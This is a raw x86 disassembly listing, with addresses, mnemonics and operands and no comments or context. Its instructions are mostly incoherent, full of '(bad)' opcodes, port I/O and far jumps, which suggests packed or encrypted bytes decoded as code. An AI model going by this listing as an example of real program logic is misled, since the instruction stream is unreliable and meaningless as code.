  419db8:	fs jge 0x419e1c
  419dbb:	dec    ebx
  419dbc:	inc    eax
  419dbd:	gs jo  0x419e0a
  419dc0:	mov    BYTE PTR [esi+0x5],0x17
  419dc4:	sbb    ch,BYTE PTR [eax-0x5d]
  419dc7:	call   0x33ec41d2
  419dcc:	cmc    
  419dcd:	enter  0x816d,0xd8
  419dd1:	loope  0x419dd7
  419dd3:	in     eax,dx
  419dd4:	test   BYTE PTR [edi],ch
  419dd6:	dec    ecx
  419dd7:	sbb    sp,WORD PTR [edi+0x1fcd6131]
  419dde:	aas    
  419ddf:	stc    
  419de0:	enter  0xc183,0xe3
  419de4:	xchg   esp,eax
  419de5:	push   cs
  419de6:	inc    ebx
  419de7:	sbb    DWORD PTR [esi+eax*4+0x5027fb9f],edi
  419dee:	test   DWORD PTR [ebp+0x5c],ebx
  419df1:	neg    DWORD PTR [eax-0x28a9ab35]
  419df7:	push   es
  419df8:	jg     0x419daa
  419dfa:	pop    ebp
  419dfb:	jae    0x419e3c
  419dfd:	xor    ah,BYTE PTR [edx]
  419dff:	mov    ds:0xc080cba9,al
  419e04:	outs   dx,BYTE PTR ds:[esi]
  419e06:	mov    bl,0xed
  419e08:	mov    DWORD PTR [edx-0x5a],ebp
  419e0b:	jmp    ebp
  419e0d:	push   esp
  419e0e:	cwde   
  419e0f:	cmp    esp,0x34
  419e12:	sahf   
  419e13:	dec    ecx
  419e14:	pop    eax
  419e15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419e16:	inc    ebp
  419e17:	test   eax,0xa3a5eeac
  419e1c:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  419e1e:	push   eax
  419e1f:	push   esi
  419e20:	push   edi
  419e21:	fwait
  419e22:	mov    bh,0x65
  419e24:	out    dx,eax
  419e25:	mov    eax,edx
  419e27:	pop    edi
  419e28:	nop
  419e29:	call   0xfc809d23
  419e2e:	(bad)  
  419e2f:	push   ss
  419e30:	(bad)
  419e34:	mov    ebp,0x7eec1601
  419e39:	cs into 
  419e3b:	add    esi,DWORD PTR [esi]
  419e3d:	loopne 0x419df5
  419e3f:	ret    0xf2b9
  419e42:	loop   0x419ea9
  419e44:	loope  0x419e40
  419e46:	cmp    BYTE PTR [ebp+0x53],cl
  419e49:	xchg   ebx,eax
  419e4a:	popf   
  419e4b:	retf   
  419e4c:	mov    WORD PTR [esi+ecx*4],ds
  419e4f:	pop    esp
  419e50:	and    DWORD PTR [edi+0x2d],0xfcf450bf
  419e57:	loop   0x419ed6
  419e59:	cmp    esi,0xffffffc8
  419e5c:	in     eax,dx
  419e5d:	adc    dh,0x75
  419e60:	and    DWORD PTR [ebx],eax
  419e62:	mov    eax,ds:0xa2a8a3ea
  419e67:	(bad)  [ecx]
  419e69:	add    ah,BYTE PTR [esi+eiz*2]
  419e6c:	push   cs
  419e6d:	xor    DWORD PTR [ecx+0x6bf5faf3],ebx
  419e73:	imul   edi,DWORD PTR [ebp+0x32ef2e81],0x6cc277fa
  419e7d:	fdivr  QWORD PTR [edi-0x748d1195]
  419e83:	xor    dh,BYTE PTR [edx]
  419e85:	retf   
  419e86:	jbe    0x419e0c
  419e88:	or     esp,0xffffff8e
  419e8b:	into   
  419e8c:	jae    0x419e63
  419e8e:	dec    BYTE PTR [edi]
  419e90:	sub    BYTE PTR [eax+0x6fb03d7f],ch
  419e96:	gs xor ebx,ebx
  419e99:	out    dx,eax
  419e9a:	xor    edx,DWORD PTR [eax+eax*4-0x1693f215]
  419ea1:	sbb    BYTE PTR [ecx+0x78],ch
  419ea4:	mov    al,ds:0xe6c20410
  419ea9:	addr16 adc eax,0xb45561e6
  419eaf:	(bad)  
  419eb0:	js     0x419e63
  419eb2:	xor    esp,DWORD PTR [ebp+0x52]
  419eb5:	push   es
  419eb6:	mov    al,ds:0xa85a438
  419ebb:	xchg   esi,eax
  419ebc:	adc    al,bh
  419ebe:	lods   al,BYTE PTR ds:[esi]
  419ebf:	fiadd  DWORD PTR [esi]
  419ec1:	outs   dx,BYTE PTR ds:[esi]
  419ec2:	pop    ebp
  419ec3:	loopne 0x419ebc
  419ec5:	pop    ds
  419ec6:	pop    ebp
  419ec7:	pop    esi
  419ec8:	sub    DWORD PTR [esi+eax*2-0xe],0xffffff80
  419ecd:	outs   dx,DWORD PTR ds:[esi]
  419ece:	xor    eax,0x45baad60
  419ed3:	in     al,0x45
  419ed5:	jmp    DWORD PTR [ecx+0xb91409f]
  419edb:	push   0xffffff91
  419edd:	mov    bh,0x18
  419edf:	fs adc eax,0xc248bd2e
  419ee5:	fisttp DWORD PTR [ebp+0x6c]
  419ee8:	cmp    al,0x74
  419eea:	stos   BYTE PTR es:[edi],al
  419eeb:	sahf   
  419eec:	add    al,0xc
  419eee:	jg     0x419f15
  419ef0:	xor    dl,dh
  419ef2:	shr    DWORD PTR [ecx],1
  419ef4:	ins    BYTE PTR es:[edi],dx
  419ef5:	push   ebp
  419ef6:	jmp    0x419ea4
  419ef8:	std    
  419ef9:	sahf   
  419efa:	ret    0xd82e
  419efd:	cmp    ah,BYTE PTR [eax-0x227f8912]
  419f03:	shl    BYTE PTR [edi],1
  419f05:	rol    ecx,0xed
  419f08:	ficomp WORD PTR [ecx+0x5c040b2e]
  419f0e:	ins    BYTE PTR es:[edi],dx
  419f0f:	pop    ebx
  419f10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f11:	clc    
  419f12:	ins    BYTE PTR es:[edi],dx
  419f13:	mov    bl,0x79
  419f15:	sub    al,0x79
  419f17:	lods   al,BYTE PTR ds:[esi]
  419f18:	test   bh,cl
  419f1a:	pop    ecx
  419f1b:	les    edx,FWORD PTR [edi+0x79bdac76]
  419f21:	mov    es,WORD PTR [edx+0x68b6fba8]
  419f27:	mov    dh,0x9
  419f29:	clc    
  419f2a:	pop    eax
  419f2b:	dec    ebx
  419f2c:	or     DWORD PTR [edx+0x2c],edi
  419f2f:	loope  0x419f30
  419f31:	push   ecx
  419f32:	or     di,di
  419f35:	xchg   edx,eax
  419f36:	push   edi
  419f37:	stc    
  419f38:	das    
  419f39:	shr    al,cl
  419f3b:	arpl   WORD PTR [edx-0x7e],di
  419f3e:	out    dx,eax
  419f3f:	xor    BYTE PTR [ebx],ch
  419f41:	pop    esp
  419f42:	fwait
  419f43:	sub    cl,BYTE PTR [esi-0x16cf546e]
  419f49:	xchg   DWORD PTR [ebx+0x1e71bb2f],eax
  419f4f:	add    DWORD PTR [eax+0x40],0xb8635852
  419f56:	mov    ch,BYTE PTR [ebx-0x52]
  419f59:	inc    BYTE PTR [ecx]
  419f5b:	inc    ebp
  419f5c:	ins    BYTE PTR es:[edi],dx
  419f5d:	jbe    0x419f0e
  419f5f:	sbb    eax,0xc2141ae4
  419f64:	icebp  
  419f65:	cmp    ah,BYTE PTR [edx-0x267785a7]
  419f6b:	or     BYTE PTR [ebx+0x66c80344],0xf3
  419f72:	(bad)  
  419f73:	jp     0x419f91
  419f75:	cmp    cl,BYTE PTR [eax+0x795cbeee]
  419f7b:	pop    es
  419f7c:	ins    DWORD PTR es:[edi],dx
  419f7d:	shl    DWORD PTR [ebp-0x51951b7a],1
  419f83:	das    
  419f84:	cli    
  419f85:	test   al,0xf5
  419f87:	mov    bh,0x5d
  419f89:	sub    al,0x0
  419f8b:	xor    BYTE PTR [eax],cl
  419f8d:	test   DWORD PTR [eax-0x6830f9a8],ecx
  419f93:	outs   dx,BYTE PTR ds:[esi]
  419f94:	adc    al,0x57
  419f96:	das    
  419f97:	mov    al,0x4c
  419f99:	repz sub BYTE PTR [edx+ecx*1],0xdb
  419f9e:	jg     0x41a00d
  419fa0:	jle    0x419fb4
  419fa2:	pushf  
  419fa3:	loope  0x41a010
  419fa5:	mov    eax,ds:0x5105fc48
  419faa:	test   al,0x94
  419fac:	mul    BYTE PTR [ebp-0x45]
  419faf:	imul   ebp,DWORD PTR [edx],0xffffffc8
  419fb2:	ret    0xde32
  419fb5:	push   ebp
  419fb6:	mov    edx,0xa9b7737e
  419fbc:	loope  0x419f6b
  419fbe:	push   ecx
  419fbf:	jno    0x419fcd
  419fc1:	sub    eax,0x60c07da4
  419fc6:	leave  
  419fc7:	js     0x419ffe
  419fc9:	pop    ebp
  419fca:	adc    eax,DWORD PTR [esi-0x2c54f286]
  419fd0:	loop   0x41a04e
  419fd2:	push   cs
  419fd3:	aad    0x26
  419fd5:	cmp    ebx,DWORD PTR [ebx]
  419fd7:	push   ds
  419fd8:	or     al,0x57
  419fda:	xchg   esi,eax
  419fdb:	add    BYTE PTR [edx],bh
  419fdd:	mov    dh,0x76
  419fdf:	pop    ss
  419fe0:	inc    ebx
  419fe1:	dec    eax
  419fe2:	mov    al,0x6b
  419fe4:	xor    BYTE PTR [ebx-0x1],0x6a
  419fe8:	pop    ebp
  419fe9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419fea:	aad    0xc
  419fec:	ficomp DWORD PTR [ecx+0x9]
  419fef:	jmp    0x41a00b
  419ff1:	pop    esp
  419ff2:	mov    ebp,0xf10c32c9
  419ff7:	dec    esp
  419ff8:	push   eax
  419ff9:	cmc    
  419ffa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ffb:	stc    
  419ffc:	dec    ebx
  419ffd:	jmp    0xd122:0x159dd735
  41a004:	push   esi
  41a005:	jb     0x419fb3
  41a007:	adc    cl,ah
  41a009:	jge    0x419fe9
  41a00b:	sahf   
  41a00c:	jae    0x41a00b
  41a00e:	fsub   QWORD PTR [esi+ebx*2+0x64]
  41a012:	shl    cl,0x5f
  41a015:	loope  0x41a000
  41a017:	aad    0x4c
  41a019:	ja     0x41a06f
  41a01b:	xchg   ecx,eax
  41a01c:	adc    bh,BYTE PTR [edx+0x3dbac809]
  41a022:	test   DWORD PTR [esi-0x7de8485e],eax
  41a028:	or     al,0x5f
  41a02a:	ret    
  41a02b:	jae    0x419ff5
  41a02d:	(bad)  
  41a02e:	xchg   DWORD PTR [edx],ebx
  41a030:	enter  0x4c8b,0x95
  41a034:	mov    ds:0x3deed8e3,al
  41a039:	jge    0x41a039
  41a03b:	ins    BYTE PTR es:[edi],dx
  41a03c:	add    eax,0x7905dbfd
  41a041:	mov    ebx,0xbaaba379
  41a046:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a047:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a049:	cmp    BYTE PTR [eax+ebx*1],dh
  41a04c:	imul   edi,DWORD PTR [ebx-0x85543e1],0x41
  41a053:	lods   eax,DWORD PTR ds:[esi]
  41a054:	and    DWORD PTR [esi+0x1],edx
  41a057:	inc    edx
  41a058:	je     0x41a0ce
  41a05a:	or     al,0x9b
  41a05c:	sub    al,0x1a
  41a05e:	mov    al,ds:0x3f89f629
  41a063:	xchg   edx,eax
  41a064:	pop    edx
  41a065:	lea    esi,[ebx-0x6e]
  41a068:	retf   
  41a069:	(bad)  
  41a06a:	daa    
  41a06b:	adc    bh,BYTE PTR ds:0xebeefa92
  41a071:	lods   al,BYTE PTR ds:[esi]
  41a072:	ins    BYTE PTR es:[edi],dx
  41a073:	sbb    al,0x64
  41a075:	dec    eax
  41a076:	sub    al,BYTE PTR [eax+ecx*1+0x30]
  41a07a:	cmp    eax,0x12444a54
  41a07f:	cmp    BYTE PTR [edi],0xa2
  41a082:	sbb    bl,BYTE PTR [eax+0x6785083d]
  41a088:	or     ebx,DWORD PTR [ebp-0x2c]
  41a08b:	inc    ebx
  41a08c:	mov    WORD PTR ds:0xb5c508d9,ss
  41a092:	xor    eax,0x1c84fb42
  41a097:	adc    BYTE PTR [ebx+edx*4+0x1e],0x5
  41a09c:	cvtdq2ps xmm1,xmm1
  41a09f:	cmc    
  41a0a0:	mov    bh,ah
  41a0a2:	inc    esp
  41a0a3:	jmp    0xe5b7:0xb9ddf430
  41a0aa:	mov    al,ds:0x253de07b
  41a0af:	je     0x41a05a
  41a0b1:	mov    ds:0x346f9e21,eax
  41a0b6:	push   ebx
  41a0b7:	les    edi,FWORD PTR [ecx-0x351e3911]
  41a0bd:	push   ecx
  41a0be:	sbb    eax,0xa71e318d
  41a0c3:	sbb    ebx,DWORD PTR [edx]
  41a0c5:	shl    BYTE PTR [ebx-0x75],0xfd
  41a0c9:	fisttp QWORD PTR [edi+esi*2]
  41a0cc:	sub    dl,al
  41a0ce:	jg     0x41a0c8
  41a0d0:	les    ecx,FWORD PTR [eax-0x60d7951b]
  41a0d6:	loop   0x41a155
  41a0d8:	adc    BYTE PTR [ebx+eax*2],cl
  41a0db:	sbb    DWORD PTR ds:0x2c6a7a90,esi
  41a0e1:	adc    ax,0x2114
  41a0e5:	leave  
  41a0e6:	into   
  41a0e7:	adc    al,0xc0
  41a0e9:	outs   dx,BYTE PTR ds:[esi]
  41a0ea:	push   ecx
  41a0eb:	stos   BYTE PTR es:[edi],al
  41a0ec:	cs lock (bad) 
  41a0ef:	fidiv  DWORD PTR [eax+0x7d5e9293]
  41a0f5:	inc    BYTE PTR [edx+0x28367eb7]
  41a0fb:	add    bl,BYTE PTR [edx]
  41a0fd:	lock jmp 0x41a081
  41a100:	(bad)  
  41a101:	fidiv  DWORD PTR [ebx-0x7e]
  41a104:	std    
  41a105:	sbb    edi,DWORD PTR [esi+esi*8-0x1b]
  41a109:	mov    WORD PTR [esi+ebx*8+0x40bb4815],?
  41a110:	(bad)  [ebx-0x63bdeadd]
  41a116:	mov    eax,ds:0x9faa6e1e
  41a11b:	daa    
  41a11c:	add    al,0xc9
  41a11e:	(bad)  [eax+eiz*4-0x5eb2f79]
  41a125:	cmp    eax,0x30f0d678
  41a12a:	and    eax,0x60e19633
  41a12f:	iret   
  41a130:	ins    DWORD PTR es:[edi],dx
  41a131:	add    cl,BYTE PTR [esi-0x2f]
  41a134:	sub    DWORD PTR ds:0xa146d189,esi
  41a13a:	enter  0xb1ec,0xa1
  41a13e:	repz xor eax,0xd19ece57
  41a145:	or     DWORD PTR [esp+ebp*2-0x12],edx
  41a149:	mov    bl,0x7c
  41a14b:	adc    DWORD PTR [ebx-0x73],eax
  41a14e:	and    eax,0x1286b8f3
  41a153:	adc    eax,ebx
  41a155:	jno    0x41a0e5
  41a157:	fwait
  41a158:	inc    edi
  41a159:	mov    BYTE PTR [esi],al
  41a15b:	icebp  
  41a15c:	je     0x41a0e5
  41a15e:	stos   DWORD PTR es:[edi],eax
  41a15f:	add    ah,BYTE PTR [esi+edx*8+0x5330264c]
  41a166:	adc    bh,0xca
  41a169:	add    DWORD PTR [ecx+0x64d9fc5d],esi
  41a16f:	data16 mov dl,0xb9
  41a172:	cmp    ecx,edx
  41a174:	xchg   esi,eax
  41a175:	lock ds or al,0xe
  41a179:	lds    eax,FWORD PTR [ecx+edi*2]
  41a17c:	mov    al,ds:0x79d4150c
  41a181:	mov    cl,0x1c
  41a183:	neg    DWORD PTR [ecx-0x9700eb]
  41a189:	push   eax
  41a18a:	ins    BYTE PTR es:[edi],dx
  41a18b:	(bad)  
  41a18c:	adc    dh,cl
  41a18e:	scas   eax,DWORD PTR es:[edi]
  41a18f:	lahf   
  41a190:	mov    BYTE PTR [eax],ch
  41a192:	and    DWORD PTR [ebp+0x19f42253],esi
  41a198:	pop    edx
  41a199:	xor    ecx,DWORD PTR [esi]
  41a19b:	(bad)  
  41a19c:	jp     0x41a1ac
  41a19e:	mov    bl,0x2d
  41a1a0:	scas   eax,DWORD PTR es:[edi]
  41a1a1:	(bad)  
  41a1a2:	and    al,0xa5
  41a1a4:	or     BYTE PTR [ecx+0x40f750f6],ah
  41a1aa:	icebp  
  41a1ab:	mov    cl,0x38
  41a1ad:	mov    DWORD PTR [edx-0x5f],ecx
  41a1b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a1b1:	(bad)  
  41a1b3:	add    ebp,DWORD PTR [ebp-0x66643d43]
  41a1b9:	mov    DWORD PTR [ebx],ebx
  41a1bb:	mov    DWORD PTR [ebx+0x30],0x9db8e069
  41a1c2:	mov    edx,0x75a5ebde
  41a1c7:	xchg   edi,eax
  41a1c8:	(bad)  
  41a1c9:	retf   0xd661
  41a1cc:	lods   eax,DWORD PTR ds:[esi]
  41a1cd:	icebp  
  41a1ce:	daa    
  41a1cf:	mov    bh,0x55
  41a1d1:	sub    eax,0x1fc70158
  41a1d6:	fcom   DWORD PTR [ecx+0x1a]
  41a1d9:	xor    BYTE PTR [esi],ah
  41a1db:	adc    DWORD PTR [ebx],edx
  41a1dd:	xchg   ebx,eax
  41a1de:	(bad)  
  41a1df:	in     eax,0xf7
  41a1e1:	jecxz  0x41a255
  41a1e3:	add    BYTE PTR [edi+0x153c086e],al
  41a1e9:	xlat   BYTE PTR ds:[ebx]
  41a1ea:	test   BYTE PTR [ecx],dh
  41a1ec:	add    esp,esi
  41a1ee:	or     BYTE PTR [ebp+ebp*1-0x33],bh
  41a1f2:	jp     0x41a202
  41a1f4:	fnstsw WORD PTR [edi+0x15]
  41a1f7:	sub    eax,0xa513cbd6
  41a1fc:	sub    al,0x3b
  41a1fe:	push   esp
  41a1ff:	call   0x7e124c0c
  41a204:	in     al,dx
  41a205:	sub    al,0x3e
  41a207:	push   ebx
  41a209:	push   ebp
  41a20a:	loopne 0x41a277
  41a20c:	adc    dh,BYTE PTR [ebx+esi*8]
  41a20f:	push   esp
  41a210:	dec    esi
  41a211:	and    eax,0xec85523e
  41a216:	mov    ebx,0xfde99258
  41a21b:	push   ecx
  41a21c:	stos   BYTE PTR es:[edi],al
  41a21d:	mov    eax,ds:0x88adcc11
  41a222:	pop    ds
  41a223:	popa   
  41a224:	in     al,0x15
  41a226:	cmc    
  41a227:	loop   0x41a1f2
  41a229:	dec    cl
  41a22b:	lods   al,BYTE PTR ds:[esi]
  41a22c:	pop    ss
  41a22d:	jae    0x41a1c9
  41a22f:	cdq    
  41a230:	mov    ch,0x3d
  41a232:	xor    eax,0x725a5438
  41a237:	mov    bl,0xcc
  41a239:	add    al,0x60
  41a23b:	xlat   BYTE PTR ds:[ebx]
  41a23c:	jmp    0xd388:0xdd49a447
  41a243:	mov    edx,0x73e4cd5c
  41a248:	add    eax,0x222fb246
  41a24d:	psubusw mm2,mm3
  41a250:	popa   
  41a251:	sub    DWORD PTR [esi-0x3cd53160],ebx
  41a257:	fstp   QWORD PTR [ebx-0x7d16cb00]
  41a25d:	jae    0x41a23e
  41a25f:	in     al,dx
  41a260:	nop
  41a261:	arpl   WORD PTR [ebx],bp
  41a263:	scas   eax,DWORD PTR es:[edi]
  41a264:	inc    ebp
  41a265:	jne    0x41a2ae
  41a267:	xor    al,0x8c
  41a269:	inc    ebp
  41a26a:	mov    ?,WORD PTR ds:0x92f81c15
  41a270:	ss stos BYTE PTR es:[edi],al
  41a272:	jns    0x41a257
  41a274:	jbe    0x41a201
  41a276:	pop    ss
  41a277:	pop    ecx
  41a278:	out    dx,al
  41a279:	jl     0x41a2c2
  41a27b:	mov    ecx,0x69ef5687
  41a280:	adc    dh,0x49
  41a283:	mov    DWORD PTR [eax-0x164ab3df],ebp
  41a289:	mov    bh,0xa7
  41a28b:	fwait
  41a28c:	or     al,0x3b
  41a28e:	icebp  
  41a28f:	stos   BYTE PTR es:[edi],al
  41a290:	popf   
  41a291:	mov    al,ds:0x21a7acb1
  41a296:	pusha  
  41a297:	mov    ah,0x68
  41a299:	and    DWORD PTR [esi+0x7ee53a45],ebx
  41a29f:	inc    ecx
  41a2a0:	push   eax
  41a2a1:	mov    edi,0x269f811d
  41a2a6:	jmp    0x7548bd52
  41a2ab:	mov    al,BYTE PTR [esi+esi*1-0x2c409158]
  41a2b2:	sub    al,0xfc
  41a2b4:	mov    esp,0x6107450b
  41a2b9:	xchg   edi,eax
  41a2ba:	dec    esi
  41a2bb:	jb     0x41a31a
  41a2bd:	dec    ebp
  41a2be:	inc    eax
  41a2bf:	xlat   BYTE PTR ds:[ebx]
  41a2c0:	cs jae 0x41a342
  41a2c3:	add    cl,BYTE PTR [edx+0x27]
  41a2c6:	aas    
  41a2c7:	dec    edx
  41a2c8:	mov    ds:0x3dc288a,eax
  41a2cd:	imul   esi,DWORD PTR [esi],0xffffffb2
  41a2d0:	inc    esp
  41a2d1:	adc    ah,ah
  41a2d3:	out    dx,al
  41a2d4:	or     DWORD PTR [eax+edi*4+0x73a44719],0x1
  41a2dc:	xor    eax,0xffffffba
  41a2df:	sbb    edx,DWORD PTR [ecx]
  41a2e1:	js     0x41a2c9
  41a2e3:	jbe    0x41a2bb
  41a2e5:	sbb    edi,DWORD PTR [ecx]
  41a2e7:	test   BYTE PTR [ecx+ebx*2-0x5ad684e8],dl
  41a2ee:	(bad)  
  41a2f0:	inc    eax
  41a2f1:	aas    
  41a2f2:	stos   BYTE PTR es:[edi],al
  41a2f3:	xchg   bh,ah
  41a2f5:	lds    ebx,FWORD PTR [edx-0x13750d1b]
  41a2fb:	pushf  
  41a2fc:	dec    ecx
  41a2fd:	adc    ebx,DWORD PTR ds:0x5085f90c
  41a303:	add    bl,bl
  41a305:	(bad)  
  41a306:	pusha  
  41a307:	and    ch,bh
  41a309:	pop    es
  41a30a:	pop    ecx
  41a30b:	loop   0x41a354
  41a30d:	je     0x41a339
  41a30f:	(bad)  
  41a310:	fiadd  DWORD PTR [edx+0x7a5b04a0]
  41a316:	adc    al,0x1a
  41a318:	or     eax,0x72237b86
  41a31d:	stos   BYTE PTR es:[edi],al
  41a31e:	or     al,al
  41a320:	es xchg ecx,eax
  41a322:	dec    esi
  41a323:	sbb    esp,ecx
  41a325:	cmp    edi,DWORD PTR [esi]
  41a327:	out    0x74,eax
  41a329:	enter  0xca91,0x5c
  41a32d:	jnp    0x41a313
  41a32f:	cmp    BYTE PTR [ebx+0x2d],ch
  41a332:	sbb    eax,edx
  41a334:	jns    0x41a33e
  41a336:	rol    BYTE PTR [eax+0x0],cl
  41a339:	cmp    eax,0x4455e8d2
  41a33e:	int    0x3d
  41a340:	dec    BYTE PTR [ebx-0x30c0d5a0]
  41a346:	mov    DWORD PTR [eax-0x2cf08549],ecx
  41a34c:	shl    BYTE PTR [eax+0x1bcb186],1
  41a352:	add    dl,BYTE PTR cs:[esi]
  41a355:	mov    ebx,0x5437e294
  41a35a:	pop    edx
  41a35b:	pop    ebx
  41a35c:	int3   
  41a35d:	push   ecx
  41a35e:	out    dx,al
  41a35f:	sbb    ebx,DWORD PTR [ecx-0x4b]
  41a362:	or     al,0x52
  41a364:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a365:	pop    es
  41a366:	jns    0x41a305
  41a368:	xor    DWORD PTR [edi+0x6],esi
  41a36b:	pop    ebx
  41a36c:	sti    
  41a36d:	jg     0x41a39f
  41a36f:	adc    ebx,DWORD PTR [edx+esi*1-0x80]
  41a373:	shr    DWORD PTR [edi-0x5a395567],cl
  41a379:	mov    al,0xb2
  41a37b:	push   ecx
  41a37c:	xlat   BYTE PTR ds:[ebx]
  41a37d:	pop    ebx
  41a37e:	ja     0x41a3d1
  41a380:	and    al,0xfd
  41a382:	lods   eax,DWORD PTR ds:[esi]
  41a383:	or     eax,0x442175e3
  41a388:	ins    BYTE PTR es:[edi],dx
  41a389:	adc    eax,0x18cb8f61
  41a38e:	pop    esp
  41a38f:	mov    ah,0x7
  41a391:	stc    
  41a392:	cmp    eax,0x5ca86890
  41a398:	jnp    0x41a34b
  41a39a:	xchg   edx,eax
  41a39b:	pop    ss
  41a39c:	nop
  41a39d:	inc    edi
  41a39e:	(bad)  
  41a39f:	ss push edx
  41a3a1:	stos   BYTE PTR es:[edi],al
  41a3a2:	adc    eax,0x48fa6bd4
  41a3a7:	lsl    edx,WORD PTR [eax-0x50]
  41a3ab:	jnp    0x41a3eb
  41a3ad:	sar    DWORD PTR [esi-0x9d77285],0x91
  41a3b4:	mov    es,WORD PTR [edi-0x8e9fd19]
  41a3ba:	push   edx
  41a3bb:	fldcw  WORD PTR [ecx+0x20a4da45]
  41a3c1:	xchg   ebp,eax
  41a3c2:	or     esi,eax
  41a3c4:	cmp    al,0x55
  41a3c6:	out    0x9d,eax
  41a3c8:	(bad)  
  41a3c9:	fldl2e 
  41a3cb:	loopne 0x41a379
  41a3cd:	outs   dx,BYTE PTR ds:[esi]
  41a3ce:	int    0x6b
  41a3d0:	add    al,0x73
  41a3d2:	fbld   TBYTE PTR [eax+eax*8+0x66]
  41a3d6:	mov    BYTE PTR [edi+0x66116b34],0xe4
  41a3dd:	(bad)  
  41a3df:	mov    ebx,0x1f24de51
  41a3e4:	sti    
  41a3e5:	dec    dh
  41a3e7:	sub    BYTE PTR [edi-0x243f73f6],bl
  41a3ed:	jmp    0xbc8b19d0
  41a3f2:	cwde   
  41a3f3:	xor    al,0xf1
  41a3f5:	std    
  41a3f6:	xor    eax,0x36f97ede
  41a3fb:	add    al,0x5a
  41a3fd:	or     BYTE PTR [edi-0x1739242],ah
  41a403:	or     BYTE PTR [edx],0x80
  41a406:	nop
  41a407:	(bad)
  41a40b:	push   ds
  41a40c:	xor    al,0x41
  41a40e:	out    dx,eax
  41a40f:	pop    ebp
  41a410:	in     eax,0xac
  41a412:	test   DWORD PTR [edi+0x64e0199a],ecx
  41a418:	stos   BYTE PTR es:[edi],al
  41a419:	mov    edi,0x2ef76079
  41a41e:	mov    eax,ds:0x199d126d
  41a423:	jno    0x41a48a
  41a425:	(bad)  
  41a426:	cld    
  41a427:	add    eax,0x740f8a31
  41a42c:	ja     0x41a47a
  41a42e:	call   0x5249:0x90fd55b4
  41a435:	and    al,0xd6
  41a437:	or     BYTE PTR [ebp-0x76855a17],ah
  41a43d:	int    0xed
  41a43f:	mov    ds:0xa4635c92,eax
  41a444:	lahf   
  41a445:	loop   0x41a3d2
  41a447:	inc    sp
  41a449:	or     BYTE PTR es:[esi+ebp*1-0x77eb95b7],0x58
  41a452:	imul   esi,DWORD PTR ds:0x4b22ef1a,0x8b8b9a7f
  41a45c:	ds or  al,0x6e
  41a45f:	jno    0x41a49f
  41a461:	or     ebx,DWORD PTR [edx]
  41a463:	lods   eax,DWORD PTR ds:[esi]
  41a464:	and    edi,DWORD PTR [esi-0x793fb831]
  41a46a:	xor    ebx,DWORD PTR [edx+0x25e9a7e]
  41a470:	sar    al,1
  41a472:	es adc al,al
  41a475:	sbb    cl,BYTE PTR [ebp+edx*8-0x1bf883ef]
  41a47c:	and    eax,0xb61bbc6f
  41a481:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a482:	jp     0x41a459
  41a484:	ja     0x41a47e
  41a486:	aaa    
  41a487:	js     0x41a4cd
  41a489:	in     al,dx
  41a48a:	sbb    eax,0x520c8a20
  41a48f:	push   ecx
  41a490:	jmp    0xf5d7c3ec
  41a495:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a496:	and    eax,DWORD PTR [edx-0x5c2d4fb8]
  41a49c:	sub    DWORD PTR [eax-0x28],esi
  41a49f:	xor    ch,BYTE PTR [ecx-0x19]
  41a4a2:	or     eax,0x5222a5c5
  41a4a7:	enter  0xeef8,0xe6
  41a4ab:	loopne 0x41a4ac
  41a4ad:	cmp    al,0x9a
  41a4af:	cmc    
  41a4b0:	test   al,0x90
  41a4b2:	xchg   DWORD PTR [ecx+0x7ef5dab5],esi
  41a4b8:	xlat   BYTE PTR ds:[ebx]
  41a4b9:	jmp    0x35ba:0x2678405
  41a4c0:	jecxz  0x41a4fa
  41a4c2:	fdivr  st,st(3)
  41a4c4:	jg     0x41a528
  41a4c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a4c7:	xor    ah,BYTE PTR [eax+0x51282afa]
  41a4cd:	mov    WORD PTR [esp+edi*2+0x7f0a3d71],es
  41a4d4:	mov    DWORD PTR [esi],0x564c0d19
  41a4da:	jbe    0x41a52c
  41a4dc:	inc    ecx
  41a4dd:	popf   
  41a4de:	cwde   
  41a4df:	dec    edx
  41a4e0:	nop
  41a4e1:	pop    esp
  41a4e2:	dec    edi
  41a4e3:	xchg   edx,eax
  41a4e4:	das    
  41a4e5:	jl     0x41a533
  41a4e7:	inc    esp
  41a4e8:	sub    esi,DWORD PTR ss:[ebx-0x44]
  41a4ec:	jae    0x41a4d1
  41a4ee:	test   esp,esp
  41a4f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a4f1:	ds adc dl,al
  41a4f4:	test   DWORD PTR [edx+ecx*4-0x27],0x940adf9a
  41a4fc:	mov    BYTE PTR [ebx],cl
  41a4fe:	pop    eax
  41a4ff:	jmp    0x51b4fad0
  41a504:	jno    0x41a4f1
  41a506:	stc    
  41a507:	lods   eax,DWORD PTR ds:[esi]
  41a508:	push   edi
  41a509:	fstp   st(1)
  41a50b:	out    0x65,eax
  41a50d:	test   BYTE PTR [eax-0x12],al
  41a510:	cmp    eax,0x940fbd5c
  41a515:	push   ds
  41a516:	mov    ebx,0xb3dff102
  41a51b:	stos   DWORD PTR es:[edi],eax
  41a51c:	mov    bh,0x5
  41a51e:	xor    DWORD PTR [edi-0x2e],ecx
  41a521:	adc    ebx,DWORD PTR [esi+ecx*2+0x259d5dd9]
  41a528:	pop    ecx
  41a529:	(bad)  
  41a52b:	xor    eax,0x281d9420
  41a530:	dec    edx
  41a531:	(bad)  
  41a532:	push   ecx
  41a533:	jbe    0x41a558
  41a535:	lahf   
  41a536:	ss sub cl,bh
  41a539:	jne    0x41a56f
  41a53b:	jno    0x41a57a
  41a53d:	add    BYTE PTR [eax],ah
  41a53f:	leave  
  41a540:	dec    edi
  41a541:	dec    esi
  41a542:	push   esi
  41a543:	push   0xc0f3f89b
  41a548:	mov    ch,0xdd
  41a54a:	xchg   edi,eax
  41a54b:	add    al,0xe3
  41a54d:	scas   eax,DWORD PTR es:[edi]
